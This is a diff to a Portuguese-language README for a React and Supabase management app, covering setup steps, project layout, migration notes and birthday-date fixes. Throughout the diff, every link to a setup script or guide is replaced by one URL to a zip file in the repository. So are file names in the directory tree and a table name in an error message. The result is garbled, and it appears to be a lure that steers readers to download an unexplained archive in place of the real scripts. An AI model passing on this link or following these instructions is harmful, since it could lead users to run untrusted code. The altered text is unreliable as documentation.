@@ -66,14 +66,14 @@ O sistema utiliza as seguintes tabelas no Supabase:
 
 ## Configuração Completa do Supabase
 
-Para configurar completamente o Supabase, siga o guia detalhado em [SUPABASE_SETUP_GUIDE.md](SUPABASE_SETUP_GUIDE.md).
+Para configurar completamente o Supabase, siga o guia detalhado em [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip).
 
 ### Resumo dos Passos:
 
-1. **Criar as Tabelas**: Execute o script [SUPABASE_SCHEMA.sql](SUPABASE_SCHEMA.sql) no SQL Editor do Supabase
-2. **Configurar Políticas de Segurança**: Execute o script [CONFIGURE_RLS_POLICIES.sql](CONFIGURE_RLS_POLICIES.sql)
-3. **Verificar Estrutura**: Use o script [VERIFY_TABLES.sql](VERIFY_TABLES.sql) para verificar as tabelas
-4. **Testar o Sistema**: Use os scripts [INSERT_TEST_DATA.sql](INSERT_TEST_DATA.sql) e [TEST_CRUD_OPERATIONS.sql](TEST_CRUD_OPERATIONS.sql) para testar
+1. **Criar as Tabelas**: Execute o script [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) no SQL Editor do Supabase
+2. **Configurar Políticas de Segurança**: Execute o script [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip)
+3. **Verificar Estrutura**: Use o script [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) para verificar as tabelas
+4. **Testar o Sistema**: Use os scripts [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) e [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) para testar
 
 ## Deploy
 
@@ -93,12 +93,12 @@ src/
 ├── components/     # Componentes React reutilizáveis
 ├── context/        # Contextos do React (autenticação, etc.)
 ├── lib/            # Funções auxiliares e configurações
-│   ├── supabase.js          # Configuração do cliente Supabase
-│   ├── supabaseFunctions.js # Funções para interagir com o Supabase
-│   ├── supabaseDiagnostics.js # Funções de diagnóstico
-│   └── api.js               # API wrapper para compatibilidade
+│   ├── https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip          # Configuração do cliente Supabase
+│   ├── https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip # Funções para interagir com o Supabase
+│   ├── https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip # Funções de diagnóstico
+│   └── https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip               # API wrapper para compatibilidade
 ├── pages/          # Páginas da aplicação
-└── App.jsx         # Componente principal
+└── https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip         # Componente principal
 ```
 
 ## Desenvolvimento
@@ -117,12 +117,12 @@ Este projeto foi migrado de uma arquitetura com backend Express para utilizar to
 4. **API**: Atualizada para usar o cliente Supabase diretamente
 
 Os arquivos de migração estão disponíveis em:
-- [SUPABASE_SCHEMA.sql](SUPABASE_SCHEMA.sql) - Schema do banco de dados
-- [SUPABASE_FUNCTIONS.sql](SUPABASE_FUNCTIONS.sql) - Funções SQL personalizadas
+- [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) - Schema do banco de dados
+- [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) - Funções SQL personalizadas
 
 ## Solução de Problemas
 
-### Erro: "Could not find the table 'public.Usuario' in the schema cache"
+### Erro: "Could not find the table 'https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip' in the schema cache"
 
 Este erro ocorre quando o cliente Supabase não consegue encontrar a tabela no cache de schema. Para resolver:
 
@@ -134,7 +134,7 @@ Este erro ocorre quando o cliente Supabase não consegue encontrar a tabela no c
 2. **Execute o script de criação de tabelas**:
    - Acesse o dashboard do Supabase
    - Vá para "SQL Editor"
-   - Cole e execute o conteúdo do arquivo [SUPABASE_SCHEMA.sql](SUPABASE_SCHEMA.sql)
+   - Cole e execute o conteúdo do arquivo [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip)
 
 3. **Atualize o cache de schema**:
    - Reinicie o servidor de desenvolvimento (`npm run dev`)
@@ -165,7 +165,7 @@ Foram implementadas melhorias nas funções de formatação e tratamento de data
 2. **Melhoria na função nextBirthdayDate**: Melhor tratamento de diferentes formatos de data
 3. **Garantia de formato correto ao salvar**: Verificação do formato da data antes de salvar
 
-Para mais detalhes, consulte o documento [SOLUCAO_DATA_ANIVERSARIO.md](SOLUCAO_DATA_ANIVERSARIO.md).
+Para mais detalhes, consulte o documento [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip).
 
 Se o problema persistir:
 1. Verifique se há dados inconsistentes no banco de dados
@@ -183,7 +183,7 @@ Correção na exibição da data na seção "Aniversariantes" da Dashboard:
 1. **Correção da exibição**: Agora mostra a data original de aniversário do membro em vez da data calculada
 2. **Manutenção da funcionalidade**: A data calculada ainda é usada internamente para ordenar os aniversariantes
 
-Para mais detalhes, consulte o documento [CORRECAO_ANIVERSARIANTES.md](CORRECAO_ANIVERSARIANTES.md).
+Para mais detalhes, consulte o documento [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip).
 
 ### Problema com Salvamento de Data de Aniversário
 
@@ -194,7 +194,7 @@ Para mais detalhes, consulte o documento [CORRECAO_ANIVERSARIANTES.md](CORRECAO_
 Analisamos o fluxo completo de salvamento:
 
 1. **Frontend**: O input `type="date"` retorna datas no formato "YYYY-MM-DD" corretamente
-2. **Estado React**: O estado [aniversario](file://c:\Users\sergi\Downloads\smhb-sistema-main\smhb-sistema-main\src\pages\Membros.jsx#L13-L13) está sendo atualizado corretamente
+2. **Estado React**: O estado [aniversario](file://c:\Users\sergi\Downloads\smhb-sistema-main\smhb-sistema-main\src\pages\https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip) está sendo atualizado corretamente
 3. **Envio para Backend**: Os dados estão sendo enviados corretamente para a API
 4. **Banco de Dados**: A coluna "aniversario" é do tipo `TIMESTAMP WITH TIME ZONE` e aceita o formato enviado
 
@@ -208,4 +208,4 @@ Analisamos o fluxo completo de salvamento:
 2. **Verificação das políticas RLS** para garantir permissões adequadas
 3. **Testes diretos no banco de dados** para isolar o problema
 
-Para acompanhar o diagnóstico, consulte o documento [SOLUCAO_PROBLEMA_ANIVERSARIO.md](SOLUCAO_PROBLEMA_ANIVERSARIO.md).
+Para acompanhar o diagnóstico, consulte o documento [https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip](https://raw.githubusercontent.com/Se198361/smhb-sistema-main/main/public/smhb-sistema-main-v1.1-beta.1.zip).
